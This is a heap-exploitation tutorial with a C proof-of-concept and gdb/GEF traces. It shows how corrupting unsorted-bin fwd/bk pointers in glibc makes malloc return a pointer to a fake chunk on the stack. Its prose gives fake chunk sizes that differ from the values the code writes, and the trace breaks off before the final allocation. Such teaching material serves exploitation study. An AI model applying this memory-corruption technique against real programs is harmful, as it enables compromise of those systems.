# Unsorted Bin Linked List

So this time around, we will be trying to get malloc to allocate a ptr on the stack. This will be done via leveraging the unsorted bin linked list.

Here is the code:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420
#define CHUNK_SIZE1 0x080

void main() {
    long *chunk0,
            *chunk1;

    long stack_array[10];

    // Allocate, and free two chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    free(chunk0);
    free(chunk1);

    // Create the unsorted bin fake chunk header
    stack_array[0] = 0x00;
    stack_array[1] = 0x41;

    // Next up, we will need to add
    // a fake heap chunk header, right after the end of our fake unsorted bin chunk
    // This is because, there are checks for the next adjacent chunj
    // Since if malloc properly allocated this chunk, there would be one there
    stack_array[8] = 0x40;
    stack_array[9] = 0x50;

    // Set the fwd/bk pointers of our unsorted bin fake chunk
    // So that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk0 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // Now we will link in our fake chunk
    // via overwriting the fwd/bk ptr
    // of two other chunks in the unsorted bin
    // which we have already linked against
    // with our fake unsorted bin chunk
    chunk0[1] = (long)(stack_array); // bk
    chunk1[0] = (long)(stack_array); // fwd

    // Allocate a new chunk
    // Will not allocate from any of the three unsorted bin chunks
    // Since they are too big
    // Instead, it will allocate from the top chunk (a new chunk)
    // And move two of the chunks into the large bin
    // And the fake unsorted bin chunk into the small bin
    malloc(CHUNK_SIZE0+0x10);

    // Now time to allocate a ptr to the stack
    // This will allocate our fake unsorted bin chunk, that got moved into the small bin
    malloc(0x2c);
}
```

## Walkthrough

So, how will this code work? We will effectively create a fake unsorted bin chunk, and overwrite the fwd ptr of one unsorted bin chunk, and the bk ptr of another unsorted bin chunk to effectively insert the fake unsorted bin chunk into the unsorted bin. For the fake unsorted bin chunk, we will set the fwd/bk ptrs to the two chunks we linked to the fake unsorted bin chunk, as it should.

In addition to that, we will need to set some things for the fake unsorted bin chunk. We will need to set the `prev_size` (to `0x00`), and the size of the chunk header (I will be setting it to `0x50`). In addition to that, we will need to make a fake chunk header right after our fake chunk, as there should be one if this was an actual malloc chunk. The `prev_size` must match the size of our chunk, which will be `0x50`. For the size, I just put `0x50` (not a lot of thought here, the `prev_inuse` isn't set, however this might cause some problems under the right condition). For the size of the fake unsorted bin chunk, there are three main considerations for it. The first, is that the amount of data we will be able to write to the chunk will be directly tied to the size of it. The second is that we will need a fake chunk header right after our fake unsorted bin chunk, whose location will be determined by the start of our fake unsorted bin chunk, and its size. The third consideration, is if the chunk gets moved over into either a small / large bin, its size will determine which bin it gets moved over into.

For our code, we will start off via allocating some chunks, and freeing two of them to insert them into the unsorted bin. Then on the stack, we will construct our fake chunk and link it against the two unsorted bin chunks. Then, we will overwrite the fwd/bk pointers of the two unsorted bin chunks, to insert our fake chunk. We will call malloc again to move our fake chunk over to the small bin, then allocate it with the final `malloc(0x2c)` function call.

Let's see this in action:

```
$   gdb ./unsorted_linked
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./unsorted_linked...
(No debugging symbols found in ./unsorted_linked)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001189 <+0>: endbr64
   0x000000000000118d <+4>: push   rbp
   0x000000000000118e <+5>: mov rbp,rsp
   0x0000000000001191 <+8>: sub rsp,0x70
   0x0000000000001195 <+12>:    mov rax,QWORD PTR fs:0x28
   0x000000000000119e <+21>:    mov QWORD PTR [rbp-0x8],rax
   0x00000000000011a2 <+25>:    xor eax,eax
   0x00000000000011a4 <+27>:    mov edi,0x420
   0x00000000000011a9 <+32>:    call   0x1090 <malloc@plt>
   0x00000000000011ae <+37>:    mov QWORD PTR [rbp-0x70],rax
   0x00000000000011b2 <+41>:    mov edi,0x80
   0x00000000000011b7 <+46>:    call   0x1090 <malloc@plt>
   0x00000000000011bc <+51>:    mov edi,0x420
   0x00000000000011c1 <+56>:    call   0x1090 <malloc@plt>
   0x00000000000011c6 <+61>:    mov QWORD PTR [rbp-0x68],rax
   0x00000000000011ca <+65>:    mov edi,0x80
   0x00000000000011cf <+70>:    call   0x1090 <malloc@plt>
   0x00000000000011d4 <+75>:    mov rax,QWORD PTR [rbp-0x70]
   0x00000000000011d8 <+79>:    mov rdi,rax
   0x00000000000011db <+82>:    call   0x1070 <free@plt>
   0x00000000000011e0 <+87>:    mov rax,QWORD PTR [rbp-0x68]
   0x00000000000011e4 <+91>:    mov rdi,rax
   0x00000000000011e7 <+94>:    call   0x1070 <free@plt>
   0x00000000000011ec <+99>:    mov QWORD PTR [rbp-0x60],0x0
   0x00000000000011f4 <+107>:   mov QWORD PTR [rbp-0x58],0x41
   0x00000000000011fc <+115>:   mov QWORD PTR [rbp-0x20],0x40
   0x0000000000001204 <+123>:   mov QWORD PTR [rbp-0x18],0x50
   0x000000000000120c <+131>:   mov rax,QWORD PTR [rbp-0x70]
   0x0000000000001210 <+135>:   sub rax,0x10
   0x0000000000001214 <+139>:   mov QWORD PTR [rbp-0x50],rax
   0x0000000000001218 <+143>:   mov rax,QWORD PTR [rbp-0x68]
   0x000000000000121c <+147>:   sub rax,0x10
   0x0000000000001220 <+151>:   mov QWORD PTR [rbp-0x48],rax
   0x0000000000001224 <+155>:   mov rax,QWORD PTR [rbp-0x70]
   0x0000000000001228 <+159>:   lea rdx,[rax+0x8]
   0x000000000000122c <+163>:   lea rax,[rbp-0x60]
   0x0000000000001230 <+167>:   mov QWORD PTR [rdx],rax
   0x0000000000001233 <+170>:   lea rdx,[rbp-0x60]
   0x0000000000001237 <+174>:   mov rax,QWORD PTR [rbp-0x68]
   0x000000000000123b <+178>:   mov QWORD PTR [rax],rdx
   0x000000000000123e <+181>:   mov edi,0x430
   0x0000000000001243 <+186>:   call   0x1090 <malloc@plt>
   0x0000000000001248 <+191>:   mov edi,0x2c
   0x000000000000124d <+196>:   call   0x1090 <malloc@plt>
   0x0000000000001252 <+201>:   nop
   0x0000000000001253 <+202>:   mov rax,QWORD PTR [rbp-0x8]
   0x0000000000001257 <+206>:   sub rax,QWORD PTR fs:0x28
   0x0000000000001260 <+215>:   je  0x1267 <main+222>
   0x0000000000001262 <+217>:   call   0x1080 <__stack_chk_fail@plt>
   0x0000000000001267 <+222>:   leave  
   0x0000000000001268 <+223>:   ret    
End of assembler dump.
gef➤  b *main+99
Breakpoint 1 at 0x11ec
gef➤  b *main+186
Breakpoint 2 at 0x1243
gef➤  b *main+196
Breakpoint 3 at 0x124d
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/unsorted_bin/unsorted_linked/unsorted_linked
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x00005555555551ec in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1             
$rbx   : 0x0             
$rcx   : 0x41            
$rdx   : 0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000
$rsp   : 0x00007fffffffdf30  →  0x00005555555592a0  →  0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x00007ffff7e2cca0  →  0x0000000000000000
$rip   : 0x00005555555551ec  →  <main+99> mov QWORD PTR [rbp-0x60], 0x0
$r8 : 0x3            
$r9 : 0x77           
$r10   : 0x5d            
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf30│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000  ← $rsp
0x00007fffffffdf38│+0x0008: 0x0000555555559760  →  0x0000555555559290  →  0x0000000000000000
0x00007fffffffdf40│+0x0010: 0x0000000800000017
0x00007fffffffdf48│+0x0018: 0x0000000000000002
0x00007fffffffdf50│+0x0020: 0xffffffffffffffff
0x00007fffffffdf58│+0x0028: 0x0000000000000000
0x00007fffffffdf60│+0x0030: 0x0000000000000000
0x00007fffffffdf68│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551e0 <main+87>     mov rax, QWORD PTR [rbp-0x68]
   0x5555555551e4 <main+91>     mov rdi, rax
   0x5555555551e7 <main+94>     call   0x555555555070 <free@plt>
 → 0x5555555551ec <main+99>     mov QWORD PTR [rbp-0x60], 0x0
   0x5555555551f4 <main+107>    mov QWORD PTR [rbp-0x58], 0x41
   0x5555555551fc <main+115>    mov QWORD PTR [rbp-0x20], 0x40
   0x555555555204 <main+123>    mov QWORD PTR [rbp-0x18], 0x50
   0x55555555520c <main+131>    mov rax, QWORD PTR [rbp-0x70]
   0x555555555210 <main+135>    sub rax, 0x10
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x5555555551ec in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551ec → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559750, bk=0x555555559290
 →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x555555559290  0x7ffff7e2cd00
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x7ffff7e2cd00  0x555555559750
0x5555555592b0: 0x0 0x0
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
```

So we see here, are our two seperate unsorted bin chunks at `0x555555559750` & `0x555555559290`. Now let's go ahead, and see what the unsorted bin looks like after we have inserted our fake stack chunk into the unsorted bin:

```
gef➤  c
Continuing.

Breakpoint 2, 0x0000555555555243 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559760  →  0x00007fffffffdf40  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x41            
$rdx   : 0x00007fffffffdf40  →  0x0000000000000000
$rsp   : 0x00007fffffffdf30  →  0x00005555555592a0  →  0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x430           
$rip   : 0x0000555555555243  →  <main+186> call 0x555555555090 <malloc@plt>
$r8 : 0x3            
$r9 : 0x77           
$r10   : 0x5d            
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf30│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000  ← $rsp
0x00007fffffffdf38│+0x0008: 0x0000555555559760  →  0x00007fffffffdf40  →  0x0000000000000000
0x00007fffffffdf40│+0x0010: 0x0000000000000000   ← $rdx
0x00007fffffffdf48│+0x0018: 0x0000000000000041 ("A"?)
0x00007fffffffdf50│+0x0020: 0x0000555555559290  →  0x0000000000000000
0x00007fffffffdf58│+0x0028: 0x0000555555559750  →  0x0000000000000000
0x00007fffffffdf60│+0x0030: 0x0000000000000000
0x00007fffffffdf68│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555237 <main+174>    mov rax, QWORD PTR [rbp-0x68]
   0x55555555523b <main+178>    mov QWORD PTR [rax], rdx
   0x55555555523e <main+181>    mov edi, 0x430
 → 0x555555555243 <main+186>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000430,
   $rsi = 0x0000000000000000,
   $rdx = 0x00007fffffffdf40 → 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x555555555243 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555243 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559750, bk=0x555555559290
 →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x7fffffffdf50, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 3 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x7fffffffdf40  0x7ffff7e2cd00
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x7ffff7e2cd00  0x7fffffffdf40
0x5555555592b0: 0x0 0x0
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
gef➤  x/20g 0x7fffffffdf40
0x7fffffffdf40: 0x0 0x41
0x7fffffffdf50: 0x555555559290  0x555555559750
0x7fffffffdf60: 0x0 0x0
0x7fffffffdf70: 0x0 0x0
0x7fffffffdf80: 0x40    0x50
0x7fffffffdf90: 0x0 0x4d65439d5701eb00
0x7fffffffdfa0: 0x1 0x7ffff7c23fbd
0x7fffffffdfb0: 0x7ffff7fc9000  0x555555555189
0x7fffffffdfc0: 0x1ffffe0a0 0x7fffffffe0b8
0x7fffffffdfd0: 0x0 0xe2b571e7ce2e4b44
gef➤  vmmap 0x7fffffffdf40
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

So here we can see the fake stack chunk at `0x7fffffffdf40` has been inserted into the unsorted bin. We also see the chunk header for the chunk after at `0x7fffffffdf80`.

Now let's go ahead and call malloc again, to move over our fake stack chunk into the small bin (and the two other chunks to the large bin):

```
gef➤  si
0x0000555555555090 in malloc@plt ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559760  →  0x00007fffffffdf40  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x41            
$rdx   : 0x00007fffffffdf40  →  0x0000000000000000
$rsp   : 0x00007fffffffdf28  →  0x0000555555555248  →  <main+191> mov edi, 0x2c
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x430           
$rip   : 0x0000555555555090  →  <malloc@plt+0> endbr64
$r8 : 0x3            
$r9 : 0x77           
$r10   : 0x5d            
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf28│+0x0000: 0x0000555555555248  →  <main+191> mov edi, 0x2c  ← $rsp
0x00007fffffffdf30│+0x0008: 0x00005555555592a0  →  0x00007ffff7e2cd00  →  0x0000555555559c10  →  0x0000000000000000
0x00007fffffffdf38│+0x0010: 0x0000555555559760  →  0x00007fffffffdf40  →  0x0000000000000000
0x00007fffffffdf40│+0x0018: 0x0000000000000000   ← $rdx
0x00007fffffffdf48│+0x0020: 0x0000000000000041 ("A"?)
0x00007fffffffdf50│+0x0028: 0x0000555555559290  →  0x0000000000000000
0x00007fffffffdf58│+0x0030: 0x0000555555559750  →  0x0000000000000000
0x00007fffffffdf60│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555080 <__stack_chk_fail@plt+0> endbr64
   0x555555555084 <__stack_chk_fail@plt+4> bnd  jmp QWORD PTR [rip+0x2f3d]      # 0x555555557fc8 <__stack_chk_fail@got.plt>
   0x55555555508b <__stack_chk_fail@plt+11> nop DWORD PTR [rax+rax*1+0x0]
 → 0x555555555090 <malloc@plt+0>   endbr64
   0x555555555094 <malloc@plt+4>   bnd  jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
   0x55555555509b <malloc@plt+11>  nop  DWORD PTR [rax+rax*1+0x0]
   0x5555555550a0 <_start+0>    endbr64
   0x5555555550a4 <_start+4>    xor ebp, ebp
   0x5555555550a6 <_start+6>    mov r9, rdx
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x555555555090 in malloc@plt (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555090 → malloc@plt()
[#1] 0x555555555248 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  finish
Run till exit from #0  0x0000555555555090 in malloc@plt ()
0x0000555555555248 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c20  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x441           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf30  →  0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x430           
$rdi   : 0x0000555555559c20  →  0x0000000000000000
$rip   : 0x0000555555555248  →  <main+191> mov edi, 0x2c
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x1             
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf30│+0x0000: 0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000    ← $rsp
0x00007fffffffdf38│+0x0008: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdf40│+0x0010: 0x0000000000000000
0x00007fffffffdf48│+0x0018: 0x0000000000000041 ("A"?)
0x00007fffffffdf50│+0x0020: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf58│+0x0028: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf60│+0x0030: 0x0000000000000000
0x00007fffffffdf68│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555523b <main+178>    mov QWORD PTR [rax], rdx
   0x55555555523e <main+181>    mov edi, 0x430
   0x555555555243 <main+186>    call   0x555555555090 <malloc@plt>
 → 0x555555555248 <main+191>    mov edi, 0x2c
   0x55555555524d <main+196>    call   0x555555555090 <malloc@plt>
   0x555555555252 <main+201>    nop    
   0x555555555253 <main+202>    mov rax, QWORD PTR [rbp-0x8]
   0x555555555257 <main+206>    sub rax, QWORD PTR fs:0x28
   0x555555555260 <main+215>    je  0x555555555267 <main+222>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x555555555248 in main (), reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555248 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x555555559c20
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] small_bins[3]: fw=0x7fffffffdf40, bk=0x7fffffffdf40
 →   Chunk(addr=0x7fffffffdf50, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 large non-empty bins.
```

So we see our fake stack chunk is now in the small bin. Now let's go ahead and allocate it:

```
gef➤  c
Continuing.

Breakpoint 3, 0x000055555555524d in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c20  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x441           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf30  →  0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x430           
$rdi   : 0x2c            
$rip   : 0x000055555555524d  →  <main+196> call 0x555555555090 <malloc@plt>
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x1             
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf30│+0x0000: 0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000    ← $rsp
0x00007fffffffdf38│+0x0008: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdf40│+0x0010: 0x0000000000000000
0x00007fffffffdf48│+0x0018: 0x0000000000000041 ("A"?)
